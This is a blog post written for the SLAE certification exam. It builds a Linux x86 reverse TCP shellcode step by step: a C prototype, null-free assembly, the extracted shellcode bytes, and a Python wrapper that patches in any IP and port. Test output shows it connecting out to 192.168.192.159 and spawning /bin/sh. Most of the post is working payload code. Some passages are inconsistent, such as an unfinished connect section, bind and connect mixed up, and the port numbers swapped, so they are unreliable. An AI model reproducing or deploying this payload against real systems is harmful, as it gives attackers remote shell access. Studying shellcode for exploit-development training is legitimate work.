---
title: SLAE exam assignment 02
author: Stipe Marinovic
date: 2020-05-25 23:00:00 +0800
categories: [Blogging, Tutorial]
tags: [slae, shellcoding]
toc: true
---
## Assignment 02 ##

* Create a Shell_Reverse_TCP shellcode
 – Reverse connects to configured IP and Port  
 – Execs shell on successful connecion
* IP and Port should be easily configurable

## Prototype ##

To get idea how reverse shell works and which syscalls are used/needed, the same as for assignment 01 - bind shell, we can create prototye of reverse shell code in C.  

```
#define _GNU_SOURCE # added to avoid gcc's implicit declaration of function warning
#include <unistd.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main(int argc, char *argv[])
{
    struct sockaddr_in saddress;
    int socketfd;

    saddress.sin_family = AF_INET;
    saddress.sin_addr.s_addr = inet_addr("192.168.192.159");
    saddress.sin_port = htons(4444);

    socketfd = socket(AF_INET, SOCK_STREAM, 0);
    connect(socketfd, (struct sockaddr *)&saddress, sizeof(saddress));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0;
}
```

Once application is compiled (`with: gcc bind.c`) and run (`./a.out`), we can confirm with netcat (`nc -nvlp 4444`) on remote host that reverse shell is established. 
![bind shell](https://smarinovic.github.io/assets/img/slae_00008.png)

## Syscalls ##

Based on prototype code above, we can conclude that following syscalls are needed to implement bind shell:

* socket
* connect
* dup2
* execve

List of all syscalls and their associated numbers can be found in: unistd_32.h. On Kali 2019.4 linux file is located on following location: 
```
/usr/include/i386-linux-gnu/asm/unistd_32.h
```
```
Syscall               Dec   Hex
----------------------------------
#define __NR_socket   359   0x167
#define __NR_connect  362   0x16A
#define __NR_dup2     63    0x3F
#define __NR_execve   11    0xB
```

Each syscall and its arguments are defined in man 2 pages in form of C function. In order to find out which argments are needed we need to look at man pages (`man 2 socket`). 

```
int socket(int domain, int type, int protocol);
```
> socket()  creates an endpoint for communication and returns a file descriptor that refers to that endpoint.  
> The domain argument specifies a communication domain; this selects the protocol family which will be used for communication.  These families are defined in <sys/socket.h>.  
> The socket has the indicated type, which specifies the communication semantics.  
> The protocol specifies a particular protocol to be used with the socket.  Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case protocol can be specified as 0.
  
Arguments are passed via registers in following order; EAX, EBX, ECX, EDX, ESI, EDI. EAX always contains syscall number (in case of socket it is decimal 359 or hex 0x167). 
The domain, type and protocol needs to be passed in EBX, ECX and EDX registers.
  
Assemlby instraction: `MOV EAX, value` is used to move value to EAX register. Since shell code will most probably be used within exploit, payload cannot contain null byte as null byte (\x00) terminates string and break exploit. Playing with msf-nasm_shell.rb script which is available in Kali linux we can see that opcode for MOV EAX, 0x167 contains null bytes.
```
nasm > mov eax, 0x167
00000000  B867010000        mov eax, 0x167
Null Bytes -----^^^^
```
To mitigate this issue, we need to find another way of placing 0x167 in EAX register. One way is to do this is to clear EAX register (set it to zero) and once EAX register is set to zero use MOV AX, 0x167 which refers to first 16 bit of EAX register. Opcode for such instruction does not contain null bytes as shown on following example:
```
nasm > mov ax, 0x167
00000000  66B86701          mov ax, 0x167
nasm > 
```

Once syscall number is placed in EAX register, we can continue with function arguments. If we look at prototype code: 
```
socket(AF_INET, SOCK_STREAM, 6);
``` 

Domain (AF_INET) is defined in: `/usr/include/x86_64-linux-gnu/bits/socket.h` as value "2" (PF_INET is the same as AF_INET):

```
/* Protocol families.  */
#define PF_INET         2       /* IP protocol family.  */
```
Type (SOCK_STREAM) is defined in `/usr/include/x86_64-linux-gnu/bits/socket_type.h` as value "1"
```
/* Types of sockets.  */
enum __socket_type
{
  SOCK_STREAM = 1,              /* Sequenced, reliable, connection-based
                                   of fixed maximum length.  */
```

Since moving values 1, 2 and 6 to EBX, ECX and EDX would generate null bytes as shown on following block code: 
```
nasm > mov EBX, 0x2
00000000  BB02000000        mov ebx,0x2 
Null bytes ---^^^^^^
                                   
nasm > mov ECX, 0x1
00000000  B901000000        mov ecx,0x1
Null bytes ---^^^^^^

nasm > mov EDX, 0x6
00000000  BA06000000        mov edx,0x6 
Null bytes ---^^^^^^
```

similar to moving value to EAX register, we can move values to BL, CL and DL wich represents first 8 bites of EBX, ECX and EDX registers. We couldn't use MOV AL, 0x167 as 0x167 requires more than 8 bits so AX had to be used.

```
nasm > mov bl, 0x2
00000000  B302              mov bl,0x2
nasm > mov cl, 0x1
00000000  B101              mov cl,0x1
nasm > mov dl, 0x6
00000000  B206              mov dl,0x6
```

Before we can move any value to register we need to se registers to zero. The easiest way to do it without null bytes is to preform XOR operation on register.

```
; Clearing registers
XOR EAX, EAX    ; set EAX to zero
XOR EBX, EBX    ; set EBX to zero
XOR ECX, ECX    ; set ECX to zero
XOR EDX, EDX    ; set EDX to zero
```

When registers are set to zero we can start writing assembly code to call socket syscall:

```
MOV AX, 0x167  ; 0x167 is hex syscall to socket
MOV BL, 2      ; set domain argument
MOV CL, 1      ; set type argument
MOV DL, 6      ; set protocol argument
INT 0x80       ; interrupt

MOV EDI, EAX   ; as result of socket syscall descriptor is saved in EAX
               ; descriptor will be used with several other syscalls so
               ; we need to save it some how for later use. One way is
               ; to save it in EDI register which is least likely to be 
               ; used in following syscalls
```

Next step is to prepare registers for accept syscall. According to `man 2 connect`, connect syscall takes 3 arguments:

```
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```
> The  connect() system call connects the socket referred to by the file descriptor sockfd to the address specified by addr. The addrlen argument specifies the size of addr.  The format of the address in addr is determined by the address space of the socket sockfd; see socket(2) for further details.
> If the socket sockfd is of type SOCK_DGRAM, then addr is the address to which datagrams are sent by default, and the only address from which datagrams are received.   If  the  socket  is  of type SOCK_STREAM or SOCK_SEQPACKET, this call attempts to make a connection to the socket that is bound to the address specified by addr.
> Generally, connection-based protocol sockets may successfully connect() only once; connectionless protocol sockets may use  connect()  multiple  times  to change  their  association.   Connectionless sockets may dissolve the association by connecting to an address with the sa_family member of sockaddr set to AF_UNSPEC (supported on Linux since kernel 2.2).
> addrlen specifies the size, in bytes, of the address structure pointed to by addr.

First we need to clear EAX register so that we can place a syscall number (0x16A) in it.

```
XOR EAX, EAX
MOV AX, 0x16A
```

Then we need to push struct on the stack. Since stack grows from higher addresses to lower addresses, last argument needs to be pushed first and due to little endian format values needs to be pushed in reverse order. 
```
server.sin_addr.s_addr = htonl("192.168.192.159"); // remote host IP address
server.sin_port = htons(4444);                     // port 4444
server.sin_family = AF_INET;                       // address family (ip v4)
```
There is also 4th parameter: sin_zero wish is always zero. So in order to push these values onto the stack we have to use push in following order:

```
XOR  ECX, ECX    ; clear ECX so that we can push zero to the stack
PUSH ECX         ; push zero_sin = 0 to the stack
PUSH ECX         ; push INADDR_ANY = 0.0.0.0 to the stack
PUSH word 0x5c11 ; push hex 0x5c11 (dec 4444) in reverse oreder due to little endian
PUSH word 0x02   ; push hex 0x02 (dec 2) on the stack. 2 represents AF_INET
```

When struct is placed on the stack, ESP is pointing to the top of the stack, so we need to place address from ESP to ECX as address needs to be passed as 2nd argument to bind syscall.
Once we have struct placed on the stack we can write assembly code for bind syscall.

```
MOV EBX, EAX     ; copy value from EAX to EBX, EAX holds pointer to socket descriptor as result of socket call
MOV ECX, ESP     ; move address pointing to the top of the stack to ECX
MOV DL, 0x16     ; move value 0x16 to EDX as third parameter
INT 0x80         ; interrupt
```


Almost there.. next we need to call dup2 syscall with following arguments:
```
int dup2(int oldfd, int newfd);
```
The dup2() system call performs the same task as dup(), but instead of using the lowest-numbered unused file descriptor, it uses the file descriptor number specified in newfd.  If the file descriptor newfd was previously open, it is silently closed before being reused.

Looking at prototype we can see that dup2() needs to be called three time, for STDIN (0), STOUT (2) and STDERR (3).

```
dup2(socketid, 0);
dup2(socketid, 1);
dup2(socketid, 2);
```

To reduce shell code size, instad of manually goind thru each dup2 syscall, we can create a loop. 
ECX register will be used as counter but also as 2nd argument to dup2 syscall.

```
MOV CL, 0x3     ; putting 3 in the counter
LOOP_DUP2:      ; loop label
XOR EAX, EAX    ; clear EAX
MOV AL, 0x3F    ; putting the syscall code in EAX
MOV EBX, EDI    ; putting our new socket descriptor in EBX
DEC CL          ; decrementing CL by one (so at first CL will be 2 then 1 and then 0)
INT 0x80        ; interrupt
JNZ LOOP_DUP2   ; "jump non zero" jumping back to the top of LOOP_DUP2 if the zero flag is not set
```

And finaly execve syscall.

```
int execve(const char *pathname, char *const argv[], char *const envp[]);
```
execve()  executes the program referred to by pathname.  
This causes the program that is currently being run by the calling process to be replaced with a new program, 
with newly initialized stack, heap, and (initialized and uninitialized) data segments.
pathname must be either a binary executable, or a script starting with a line of the form: `#!interpreter [optional-arg]`.
  
argv is an array of argument strings passed to the new program.  By convention, the first of these strings (i.e., argv[0]) should  contain  the  filename associated  with  the file being executed.  envp is an array of strings, conventionally of the form key=value, which are passed as environment to the new program. 
The argv and envp arrays must each include a null pointer at the end of the array.

First we need to push values to the stack. Argv and envp need to have null pointer as well as path name must be null terminated. Since stack grovs from higher to lower memory address, first we need to push null byte and then "/bin/sh" in reverse order. Additinal remark, since "/bin/sh" takes 7 bytes, we can add another slash to have 8 bytes "//bin/sh" and avoid null bytes. 
In order to push null byte to stack, we need to zero-out EAX and push it to stack:

```
XOR EAX, EAX
PUSH EAX
```

After that, we need to push "//bin/sh"
```
PUSH 0x68732f6E
PUSH 0x69622f2F
```

Then we need to place pointer to beggining of stack to EBX. ESP is pointing to the beggining of the stack and put null pointer by pushing EAX to the stack.
```
MOV EBX, ESP
PUSH EAX
MOV EDX, ESP
```

ECX should point to the location of EBX so we can push EBX to the stack and move ESP which points to the top of the stack to EXC and finaly load execve syscall number to EAX (AL).
```
PUSH EBX
MOV ECX, ESP
MOV AL, 0x0Bž
INT 0x80
```

## Reverse shell code ##

So when we put it all together and add sections and entry point the result is following:

```
global _start

section .text
_start: 

        ; clear registers
        XOR EAX, EAX     ; set EAX to zero
        XOR EBX, EBX     ; set EBX to zero
        XOR ECX, ECX     ; set ECX to zero
        XOR EDX, EDX     ; set EDX to zero

        ; socket syscall
        MOV AX, 0x167    ; 0x167 is hex syscall to socket
        MOV BL, 2        ; set domain argument
        MOV CL, 1        ; set type argument
        MOV DL, 6        ; set protocol argument
        INT 0x80         ; interrupt

        MOV EDI, EAX     ; as result of socket syscall descriptor is saved in EAX
                         ; descriptor will be used with several other syscalls so
                         ; we need to save it some how for later use. One way is
                         ; to save it in EDI register which is least likely to be 
                         ; used in following syscalls
    
        ; connect syscall
        ; to be done..

        ; dup2 syscall
        MOV CL, 0x3     ; putting 3 in the counter

LOOP_DUP2:
        XOR EAX, EAX    ; clear EAX
        MOV AL, 0x3F    ; putting the syscall code in EAX
        MOV EBX, EDI    ; putting our new socket descriptor in EBX
        DEC CL          ; decrementing CL by one (so at first CL will be 2 then 1 and then 0)
        INT 0x80        ; interrupt
        JNZ LOOP_DUP2   ; "jump non zero" jumping back to the top of LOOP_DUP2 if the zero flag is not set

 
        ; execve syscall
        XOR EAX, EAX
        PUSH EAX
        PUSH 0x68732f6E
        PUSH 0x69622f2F
        MOV EBX, ESP
        PUSH EAX
        MOV EDX, ESP
        PUSH EBX
        MOV ECX, ESP
        MOV AL, 0x0B
        INT 0x80
```

We can compile and link code with:
```
nasm -f elf32 revshell.nasm -o bind.o
ld -z execstack -o revshell revshell.o  -m elf_i386
```

And when we run it, we can confirm that application is indeed connecting to remote IP address on port 4444 and provides shell.

![bind shell](https://smarinovic.github.io/assets/img/slae_000010.png)


We can use objdump to get shellcode out:

```
objdump -d bind |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x89\xc7\x31\xc9\x51\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x89\xc3\x66\xb8\x69\x01\xb2\x16\xcd\x80\x31\xc0\xb8\x6b\x01\x00\x00\x89\xfb\xb1\x02\xcd\x80\x31\xc0\xb8\x6c\x01\x00\x00\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x31\xff\x89\xc7\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

And when we put it is skeleton C program, we can also confirm it works with netstat:

```
gcc -fno-stack-protector -z execstack -m32 skeleton.c -o rev_shell
```
![opcode test](https://smarinovic.github.io/assets/img/slae_00011.png)


## Wrapper ##
Last task was to make port argument easily configurable. Suggested way is to create wrapper. To create wrapper, we need to find where port number is located. Port number is 4444 which is presented as hex (little endian format): \x11\x5c. When we know the location of port, we can split shell code in pre-port part and post-port part. Python script generates hex representation of given port number and combines all three parts (pre-port, port and post-port part of shell code) in new shell code.  

```
import sys

shell = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xb2\\x06\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x6a\\x01\\x31\\xc9\\x51\\x68IPADD\\x66\\x68PORT\\x66\\x6a\\x02\\x89\\xfb\\x89\\xe1\\xb2\\x16\\xcd\\x80\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

if len(sys.argv) != 3:
   print 'Usage: wrapper.py <ip> <port>'
   sys.exit(-1)

else:
   ip = sys.argv[1].split(".")
   port_number = sys.argv[2]


   ip_hex = "\\x" + ((hex(int(ip[0]))).replace("0x","")).zfill(2) + "\\x" + ((hex(int(ip[1]))).replace("0x","")).zfill(2) + "\\x" + ((hex(int(ip[2]))).replace("0x","")).zfill(2) + "\\x" + ((hex(int(ip[3]))).replace("0x","")).zfill(2)

   shell = shell.replace("IPADD", ip_hex)

   port_number = int(port_number)
   port_number = hex(port_number)
   port_num = port_number.replace("0x","")
   if len(port_num) < 4:
      port_num = "0" + str(port_num)
 
   port_num1 = str(port_num[:2])
   port_num2 = str(port_num[2:])

   port_hex = "\\x" + port_num1 + "\\x" + port_num2

   shell = shell.replace("PORT", port_hex)

   print shell
```

For test we will generate reverse shell code for port 5000:

![wrapper test](https://smarinovic.github.io/assets/img/slae_00006.png)

Resulting opcode:

```"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x89\xc7\x31\xc9\x51\x51\x66\x68\x0d\x05\x66\x6a\x02\x89\xe1\x89\xc3\x66\xb8\x69\x01\xb2\x16\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\xb1\x02\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x31\xff\x89\xc7\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";```

we need to copy into skeleton.c, compile and run it, and as result bind_shell is listening on port 3333 as shown on following screen shot.

![wrapper test](https://smarinovic.github.io/assets/img/slae_00012.png)

We can confir with strace on host machine and with netcat on listening machine which ports and IP addresses are used and successuful connection.
```
root@kali32bit:~/repository/slae-exam/assignment02# strace ./rev_shell
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(5000), sin_addr=inet_addr("192.168.192.159")}, 22) = 0
dup2(3, 2)                              = 2
dup2(3, 1)                              = 1
dup2(3, 0)                              = 0
execve("//bin/sh", ["//bin/sh"], 0xbfcf6cf0 /* 0 vars */) = 0
```

